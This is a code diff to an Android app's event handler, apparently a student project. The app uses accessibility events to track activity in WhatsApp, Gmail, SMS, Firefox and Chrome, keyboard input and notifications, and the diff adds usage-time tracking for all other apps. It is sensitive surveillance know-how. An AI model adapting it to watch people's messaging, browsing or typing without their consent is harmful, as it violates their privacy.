@@ -8,6 +8,7 @@ import com.alberto.tfg.tormantos.analyzer.impl.browsing.FirefoxAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.communication.GmailAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.communication.SmsAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.messaging.WhatsappAnalyzerImpl;
+import com.alberto.tfg.tormantos.analyzer.impl.system.GeneralAppAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.system.NotificationAnalyzerImpl;
 import com.alberto.tfg.tormantos.sto.EventSto;
 import com.alberto.tfg.tormantos.utils.Helper;
@@ -34,7 +35,7 @@ public class EventHandler {
     private SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/YYYY HH:mm:ss");
 
     /**
-     * String that stores the current packages the app is processing in a certai instant
+     * String that stores the current packages the app is processing in a certain instant
      */
     private String currentPackage;
 
@@ -60,6 +61,11 @@ public class EventHandler {
      */
     private NotificationAnalyzerImpl notificationAnalyzer;
 
+    /**
+     * No of our interest apps, just he time of usage
+     */
+    private GeneralAppAnalyzerImpl generalAppAnalyzer;
+
 
     public EventHandler(Context context) {
         this.context = context;
@@ -71,6 +77,29 @@ public class EventHandler {
         firefoxAnalyzer = new FirefoxAnalyzerImpl(context);
         chromeAnalyzer = new ChromeAnalyzerImpl(context);
         notificationAnalyzer = new NotificationAnalyzerImpl(context);
+        generalAppAnalyzer = new GeneralAppAnalyzerImpl(context);
+    }
+
+    /**
+     * Checks if the user switched between apps
+     *
+     * @param eventSto the eventSto.
+     */
+    private void checkAppSwitch(EventSto eventSto) {
+
+        if (!eventSto.getPackageName().equals(this.currentPackage)) {
+            switch (currentPackage) {
+                case Strings.PACKAGE_WHATSAPP:
+                    whatsappAnalyzer.checkRemainingData(eventSto);
+                    break;
+                default:
+                    break;
+            }
+            if (!Strings.PACKAGE_TORMANTOS.equals(eventSto.getPackageName())) {
+                generalAppAnalyzer.confirmEndOfUsage(eventSto);
+            }
+        }
+
     }
 
     public void handleEvent(AccessibilityEvent event, Date timestamp) {
@@ -79,18 +108,16 @@ public class EventHandler {
                 event.getPackageName().toString(),
                 event.getClassName().toString());
 
-        //  commitAnalyzerData(eventSto);
-
-        //  this.checkSource(event.getSource());
 
         // -- Stores the current listening app package name if it isn't the keyboard
         if (!eventSto.getPackageName().equals(Strings.PACKAGE_KEYBOARD) &&
                 !eventSto.getClassName().equals(Strings.CLASS_NOTIFICATION)) {
+            checkAppSwitch(eventSto);
             currentPackage = eventSto.getPackageName();
-            //Log.d(TAG, currentPackage);
         }
 
         Helper.log(eventSto);
+
 
         switch (eventSto.getPackageName()) {
 
@@ -115,17 +142,22 @@ public class EventHandler {
                 chromeAnalyzer.compute(eventSto);
                 break;
 
-            // Generals cases
+            //Social cases
+            case Strings.PACKAGE_FACEBOOK:
+                break;
+
+                // Generals cases
             case Strings.PACKAGE_KEYBOARD: // Keyboard displayed event
                 handleKeyboardEvent(eventSto);
                 break;
             case Strings.PACKAGE_SHORTCUT: // App shortcut launch event
                 handleShortchut(eventSto);
                 break;
+
             default:
-                //   Helper.log(eventSto);
                 break;
-        }
+        } // -- switch packages
+
 
         switch (eventSto.getClassName()) {
             case Strings.CLASS_NOTIFICATION: // Android notification
@@ -135,7 +167,12 @@ public class EventHandler {
             default:
                 break;
         }
+
+        if (!Strings.PACKAGE_TORMANTOS.equals(eventSto.getPackageName())) {
+            generalAppAnalyzer.compute(eventSto); // unwatched app
+        }
     }
+
 
     /**
      * Handles a keyboard event in order to
@@ -147,7 +184,7 @@ public class EventHandler {
         if (Helper.getEventText(eventSto.getEvent()).equals(Strings.KEY_KEYBOARD_SHOW_MSG)
                 && !Helper.getEventText(eventSto.getEvent()).equals(Strings.KEY_KEYBOARD_ALTERNATIVES_REJECTED)
                 && !Helper.getEventText(eventSto.getEvent()).equals(Strings.KEY_KEYBOARD_ALTERNATIVES_AVAILABLE)
-                && !Helper.getEventText(eventSto.getEvent()).equals(Strings.KEY_KEYBOARD_SHOW_SYMBOLS )) {
+                && !Helper.getEventText(eventSto.getEvent()).equals(Strings.KEY_KEYBOARD_SHOW_SYMBOLS)) {
             handleShowKeyboard(eventSto);
         } else if (Helper.getEventText(eventSto.getEvent()).equals(Strings.KEY_KEYBOARD_HIDE_MSG)) {
             handleHideKeyboard(eventSto);
@@ -179,6 +216,8 @@ public class EventHandler {
             case Strings.PACKAGE_FIREFOX:
                 firefoxAnalyzer.confirmKeyboardInput(eventSto.getCaptureInstant());
             default:
+            case Strings.PACKAGE_CHROME:
+                chromeAnalyzer.confirmKeyboardInput(eventSto.getCaptureInstant());
                 break;
         }
     }
